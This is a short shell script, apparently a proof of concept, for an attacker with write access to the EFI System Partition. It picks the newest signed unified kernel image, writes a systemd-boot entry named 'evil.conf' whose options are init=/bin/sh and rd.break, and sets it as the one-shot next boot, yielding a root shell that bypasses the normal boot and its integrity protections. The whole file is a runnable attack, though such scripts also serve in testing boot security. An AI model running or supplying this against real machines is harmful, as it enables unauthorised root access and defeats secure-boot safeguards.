# Attacker with ESP write access adds a Type #1 entry that boots the signed UKI with init=/bin/sh.
set -eux
ESP=/boot/efi
U=$(ls $ESP/EFI/Linux/*.efi | sort -V | tail -1)
cat > $ESP/loader/entries/evil.conf <<C
title evil
efi /EFI/Linux/$(basename "$U")
options init=/bin/sh rd.break console=ttyS0,115200
C
bootctl set-oneshot evil.conf
bootctl list --no-pager | grep -A3 evil
sync
